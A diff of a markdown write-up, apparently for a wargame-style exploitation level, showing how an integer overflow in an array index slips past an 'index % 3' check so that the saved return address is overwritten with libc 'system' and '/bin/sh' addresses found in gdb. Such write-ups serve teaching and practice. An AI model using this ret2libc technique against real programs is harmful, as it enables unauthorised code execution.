@@ -5,7 +5,7 @@ We need to get a shell by our own.
 
 With the function `store_number` we can write a number in an index.  
 The only restriction on the index is `index % 3 != 0`.  
-We can avoid this restriction with int overflow:
+We can avoid this restriction with an int overflow performed when the index is times by 4 because `sizeof(int) == 4`:
 
 ```bash
 Input command: store
@@ -46,14 +46,7 @@ $2 = 4159090384
 0xf7f897ec:      "/bin/sh"
 (gdb) p 0xf7f897ec
 $3 = 4160264172
-```
 
-- address of `system` = 4159090384
-- address of `/bin/sh` = 4160264172
-
-Find the offset of eip:
-
-```bash
 (gdb) i f
 Stack level 0, frame at 0xffffd710:
  eip = 0x8048857 in main; saved eip 0xf7e45513
@@ -70,14 +63,16 @@ Stack level 0, frame at 0xffffd710:
 $6 = 114
 ```
 
-Offset of `eip` = 114
+- address of `system` = 4159090384
+- address of `/bin/sh` = 4160264172
+- offset of `eip` = 114
 
-`114 % 3 == 0` so we need to overflow: 1073741824 + 114 = 1073741938
+`114 % 3 == 0` so we need to overflow: `1073741824 + 114 = 1073741938`
 
 ```bash
 Input command: store
  Number: 4159090384
- Index: 1073741938 ()
+ Index: 1073741938
  Completed store command successfully
 Input command: store
  Number: 4160264172
